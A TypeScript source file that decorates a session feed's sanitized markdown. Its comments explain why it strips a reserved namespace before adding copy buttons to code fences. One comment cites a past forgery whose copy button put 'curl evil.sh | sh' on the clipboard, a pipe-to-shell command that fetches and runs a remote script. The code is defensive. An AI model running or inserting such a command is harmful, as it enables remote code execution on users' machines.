// The feed's pass over its own sanitized markdown (#465).
//
// The counterpart of `document-render.ts` for the Session view: everything here
// runs AFTER `renderMarkdown`, which owns `marked` and DOMPurify and which
// nothing else may import (`markdown.test.tsx` asserts it).
//
// THE FIRST LINE IS THE GUARD, and that is the security property rather than a
// tidy habit: #410's forgery worked on the viewer precisely by arriving BEFORE
// the decoration pass and being mistaken for its output. #465 built this pass
// with only that line in it, for exactly the decoration #477 then added — a
// copy button, which is the shape #410 was filed over (a forged `.doc-code`
// wrapper around a hidden `<pre>`, so the button on a fence reading `npm test`
// puts `curl evil.sh | sh` on the clipboard).
//
// WHY THE FEED HAS A PROTOCOL TO PROTECT AT ALL. The feed's block renderers
// mark their expanders `data-feed-expander`, their blocks `data-feed-seq` and
// their stand-down subtrees `data-no-toggle`, and `FeedView` reads all three
// back off the live DOM (`querySelectorAll`, `querySelector`, `closest`) — the
// DOM is deliberately the list, because blocks stream in and out constantly and
// a registry we maintained would be a second copy to get wrong. The cost of
// that choice is that the DOM does not remember who wrote an attribute, and
// assistant prose renders into the same DOM.
//
// IT WORKS ON A STRING, NOT A FRAGMENT, and that is the shape `<Markdown>`
// wants: one `<template>` parse in, one serialize out, inside the same `useMemo`
// that already parsed the markdown, memoised per block on the text. The
// template's content is an inert document with no browsing context, so nothing
// fetches while we work (same reason `document-render.ts` gives at length).
import { FEED_DECORATION, stripDecorationNamespace } from './decoration-guard';
import { decorateFeedCodeFences, type FeedCodeLabels } from './feed-code';

/**
 * Sanitized HTML in, decorated HTML out — the feed's surface pass.
 *
 * `doc` is injectable for the same reason the viewer's is: a test may build the
 * tree in a document that is not the page.
 */
export function decorateFeedMarkdown(
  html: string,
  labels: FeedCodeLabels,
  doc: Document = document
): string {
  const template = doc.createElement('template');
  template.innerHTML = html;
  // FIRST, before any decoration below writes one of ours.
  stripDecorationNamespace(template.content, FEED_DECORATION);
  decorateFeedCodeFences(template.content, labels);
  return template.innerHTML;
}
